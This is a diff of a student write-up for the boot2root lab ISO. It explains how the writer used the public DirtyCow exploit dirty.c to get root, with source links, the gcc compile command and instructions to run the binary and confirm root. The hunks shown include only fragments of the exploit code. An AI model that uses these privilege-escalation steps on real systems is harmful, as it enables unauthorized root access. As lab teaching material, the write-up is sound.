@@ -1,4 +1,14 @@
-//
+# writeup2
+
+First i looked for some informations about dirtycow vulnerability exploit. I found on a forum a github link with some dirtycow vulnerability exploit. I tried to use some of this exploit to change root user on boot2root iso. and one of them works. 
+this is the code of the exploit : 
+
+source forum : https://github.com/FireFart/dirtycow/blob/master/dirty.c
+source github exploit : https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+source github code exploit : https://github.com/FireFart/dirtycow/blob/master/dirty.c
+
+
+
 // This exploit uses the pokemon exploit of the dirtycow vulnerability
 // as a base and automatically generates a new passwd line.
 // The user will be prompted for the new password when the binary is run.
@@ -192,7 +202,7 @@ int main(int argc, char *argv[])
     backup_filename, filename);
   return 0;
 }
-​
-source :    https://github.com/FireFart/dirtycow/blob/master/dirty.c
-            https://lafibre.info/attaques/alerte-plus-importante-faille-linux-jamais-decouverte/
-            https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+
+with this, we just have to compile it with : gcc -pthread dirty.c -o dirty -lcrypt
+Then run the newly create binary by either doing: "./dirty" or "./dirty my-new-password"
+and look at the user id. We are root.
